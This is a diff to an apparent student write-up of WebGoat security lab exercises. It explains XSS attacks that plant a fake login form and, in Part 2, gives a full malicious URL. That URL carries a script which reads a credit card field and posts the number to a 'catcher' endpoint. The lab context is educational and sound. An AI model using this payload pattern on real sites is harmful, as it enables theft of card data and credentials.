@@ -6,12 +6,17 @@
 
 
 Part 1 Explanation:
-Part 1 used a XSS attack that inputs a form and javascript code into the search field. And the search field interpretes
+Part 1 used a XSS attack that inputs a form and javascript code into the search field. And the website interpretes
 the input as actual html code. The attack then constructed a fake login screen and submits recorded info to a designated
 web address
 
 
 Part 2 Explanation:
+The field for the three digit access code is exploitable (name="input2"). The mallicious code is embedded into the mallicious URL 
+and the access code input field of the website is modified by the URL. The embedded mallicious code checks the value of credit card
+number field (name="input1") and if the value is different from the default value, the credit card number is posted to the catcher.
+Unencoded URL:
+http://localhost:6869/WebGoat/start.mvc#attack/752417971/900?&input2=<SCRIPT>document.getElementsByName("input2")[0].value="";if (document.getElementsByName('input1')[0].value != "4128 3214 0002 1999") {$.post('catcher?PROPERTY=yes&stolen-credit-card='+ document.getElementsByName('input1')[0].value);}</SCRIPT>
 
 
 Part 3 Explanation:
